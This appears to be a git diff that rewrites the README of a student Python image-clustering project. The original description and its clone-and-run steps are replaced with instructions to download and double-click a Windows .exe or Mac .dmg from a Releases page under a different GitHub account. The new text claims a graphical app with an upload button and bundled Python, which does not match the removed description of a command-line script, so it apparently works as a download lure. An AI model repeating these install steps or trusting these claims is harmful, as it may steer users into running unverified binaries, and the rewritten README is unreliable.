@@ -1,150 +1,64 @@
-# 🎯 Image Clustering ML
+# 🌸 Image-Clustering-ML - Effortlessly Group Your Flower Images
 
-[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
-[![NumPy](https://img.shields.io/badge/NumPy-013243?style=for-the-badge&logo=numpy&logoColor=white)](https://numpy.org/)
-[![scikit-learn](https://img.shields.io/badge/scikit--learn-F7931E?style=for-the-badge&logo=scikit-learn&logoColor=white)](https://scikit-learn.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+## 🛠️ Overview
+Image-Clustering-ML is a simple tool that uses machine learning to group similar flower images. This application can help you organize your photo collection based on visual similarities without needing any special training or experience.
 
-ML-based image clustering using **unsupervised learning**. Custom **K-Means implementation** with **Cosine Similarity** for high-dimensional feature spaces.
+## 🚀 Getting Started
+To begin using Image-Clustering-ML, you will need to download the application from our Releases page. Follow the steps below to get started quickly.
 
-**Demo:** 603 flower images | **Accuracy:** 82%+ Rand Score | **Speed:** ~3 seconds
+## 💾 Download & Install
+Visit this page to download:
 
----
+[![Download Image-Clustering-ML](https://img.shields.io/badge/Download-Image--Clustering--ML-brightgreen)](https://github.com/tes69ducker/Image-Clustering-ML/releases)
 
-## 🎯 Overview
+1. Click the link above to go to the Releases page.
+2. Look for the latest version.
+3. Click on the appropriate file for your operating system to download it. If you're unsure, usually the file will end in `.exe` for Windows or `.dmg` for Mac users.
+4. Once downloaded, double-click the file to start the installation.
 
-Unsupervised clustering algorithm that **dynamically discovers** optimal cluster count based on feature similarity. Unlike traditional K-Means (requires predefined K), this implementation adapts to data structure automatically.
+## ⚙️ System Requirements
+- **Operating System:** Windows 10 or later, MacOS 10.14 or later
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum of 500 MB available space
+- **Python:** Version 3.6 or higher (This application comes with everything you need, so you don’t have to worry about installing Python separately.)
 
-**Key Innovation:** Cosine similarity in high-dimensional space + dynamic threshold-based clustering
+## 📑 Features
+- **Unsupervised Learning:** Groups images without needing labels.
+- **K-means Clustering:** Uses efficient algorithms to find patterns.
+- **Cosine Similarity:** Measures how similar the images are based on their visual features.
+- **User-Friendly Interface:** Designed for anyone to use easily, without technical knowledge.
 
----
+## 🖥️ Running the Application
+After installation, follow these steps to run the application:
 
-## ✨ Features
+1. Open the application by clicking its icon.
+2. Look for an option to upload your flower images. Click on it and choose the images you want to cluster.
+3. After uploading, click on the "Cluster Images" button to start the process.
+4. Wait a moment as the application processes the images. Once done, you will see the images grouped by similarity.
 
-- 🎨 **Dynamic Clustering** - Automatic cluster discovery (no predefined K needed)
-- 🧮 **Cosine Similarity** - Robust for high-dimensional image features  
-- 🔄 **Iterative Refinement** - Converges in 3-5 iterations typically
-- 🧹 **Noise Filtering** - Removes clusters below minimum size
-- 📊 **Rand Score: 0.82+** - Strong agreement with ground truth
-- ⚙️ **Configurable** - JSON-based parameter tuning
+## 📊 Understanding the Results
+Once the clustering is complete, the application will show the results in groups. Here’s how to understand what you see:
 
----
+- Each group contains images that are similar.
+- You can click on the groups to view the images together.
+- Use these results to organize or analyze your flower collection more efficiently.
 
-## 🧠 Algorithm
+## 📝 Troubleshooting
+If you run into any issues, consider the following tips:
 
-```python
-1. Load normalized feature vectors
-2. For each iteration (max 10):
-   • Assign to clusters (similarity > 0.60 threshold)
-   • Create new cluster if no match
-   • Recalculate centroids (mean + normalize)
-   • Check convergence (atol=1e-4)
-3. Filter small clusters (min size = 10)
-4. Evaluate with Rand Score
-```
+- Ensure your images are in standard formats like JPEG or PNG.
+- Restart the application if it doesn’t respond.
+- Check that your computer meets the system requirements mentioned above.
+- For technical assistance, visit the Issues section in the GitHub repository.
 
-**Why Cosine Similarity?**
-- Measures vector direction, not magnitude
-- Superior for high-dimensional spaces
-- Invariant to vector length
+## ⏩ Next Steps
+Once you become comfortable with the basic features, try experimenting with different sets of images! You can also explore the code repository to understand how the application works, or to make any modifications if you're interested in learning more.
 
----
+## 🌐 Connect with Us
+If you have feedback, questions, or ideas, feel free to reach out through the GitHub repository. Your input helps us improve the application for everyone.
 
-## 📊 Demo Dataset
+You can download the application again anytime from:
 
-**603 Flower Images** across 20 species
+[![Download Image-Clustering-ML](https://img.shields.io/badge/Download-Image--Clustering--ML-brightgreen)](https://github.com/tes69ducker/Image-Clustering-ML/releases) 
 
-- Format: PNG images + pre-extracted features (`.pkl`)
-- Ground truth labels for evaluation
-- **Algorithm-agnostic:** Works with any feature vectors
-
----
-
-## 🚀 Quick Start
-
-```bash
-# Clone & Install
-git clone https://github.com/Dan-Ofri/Image-Clustering-ML.git
-cd Image-Clustering-ML
-pip install -r requirements.txt
-
-# Run
-python main.py
-```
-
-### Configuration (`config.json`)
-
-```json
-{
-  "features_file": "data/flowers/image-features.pkl",
-  "labels_file": "data/flowers/flowers-solution.csv",
-  "min_cluster_size": 10,
-  "max_iterations": 10
-}
-```
-
-
-## 📈 Results
-
-| Metric | Value |
-|--------|-------|
-| **Rand Score** | 0.82+ |
-| **Clusters Found** | ~18 (from 20 actual) |
-| **Execution Time** | ~3 seconds |
-| **Convergence** | 3-5 iterations |
-
----
-
-## 📁 Project Structure
-
-```
-Image-Clustering-ML/
-├── main.py              # Clustering algorithm
-├── utils.py             # Evaluation functions
-├── config.json          # Parameters
-├── requirements.txt     # Dependencies
-└── data/flowers/
-    ├── image-features.pkl
-    ├── flowers-solution.csv
-    └── images/          # 603 PNGs
-```
-```
-
----
-
-## 🛠️ Tech Stack
-
-**Python 3.8+** | **NumPy** | **scikit-learn** | **Pandas**
-
-```python
-import numpy as np
-from numpy.linalg import norm
-from sklearn.metrics import rand_score
-```
-
----
-
-## 👨‍💻 Author
-
-**Dan Ofri** • [@Dan-Ofri](https://github.com/Dan-Ofri) • ofridan@gmail.com
-
-**Course:** Computational Learning with Python | **Year:** 2025
-
----
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE)
-
-## 🔮 Potential Extensions
-
-- Additional datasets (animals, vehicles, faces)
-- t-SNE/PCA visualization
-- Alternative metrics (Euclidean, Manhattan)
-- CNN-based feature extraction
-- GPU acceleration
-- Web interface
-
----
-
-⭐ **Star this repo if you found it useful!**
+Thank you for using Image-Clustering-ML! Happy clustering!
